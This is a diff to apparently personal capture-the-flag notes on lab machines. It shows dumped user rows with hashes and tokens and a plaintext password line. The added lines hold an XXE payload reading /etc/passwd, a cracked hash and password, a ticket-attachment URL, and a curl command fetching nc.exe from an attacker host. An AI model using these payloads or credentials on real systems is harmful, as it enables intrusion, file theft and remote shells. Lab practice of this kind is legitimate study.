@@ -29,6 +29,8 @@ Quantifiers:
 
 [a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+
 
+Fri, 24 Sep 2021 11:04:37 GMT
+
 
 7774082
 7252474
@@ -61,3 +63,26 @@ Bill - Juw4nnaM4n420696969!$$$
 2|Giovann1|nginxatsu-giv@makelarid.es|a8204d4ca7c9a3e2e3b2e5195c7a6206|TpaSUfQjk6CHAJmPcWRlHPtqB0JRjeBDbAmNnEhnT6sD4oVlxiu9EEqqBVqYDeaoSDCB||2021-09-22 15:13:28|2021-09-22 15:13:28
 
 3|me0wth|nginxatsu-me0wth@makelarid.es|3dfefb5a939267bea9a0afe4c8a2f28b|Gb8i4mVVfY8pCH3rP0rPWK5RVeaeUtz33iXsYdgTnPZg1QzrQ0ZpIuPv4prod9SIfP8n||2021-09-22 15:13:28|2021-09-22 15:13:28
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
+	<body>
+<table_num>5</table_num>
+<food>&ent;</food>
+</body>
+
+{"message":"Hi Shiv, To get access please find the credentials with given query"}
+
+
+	"helpme@helpme.com"
+	5d3c93182bb20f07b994a7f617e99cff : godhelpmeplz
+
+	10.10.10.121/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6
+
+
+
+	curl http://10.10.14.11:8000/nc.exe
+
+
+	
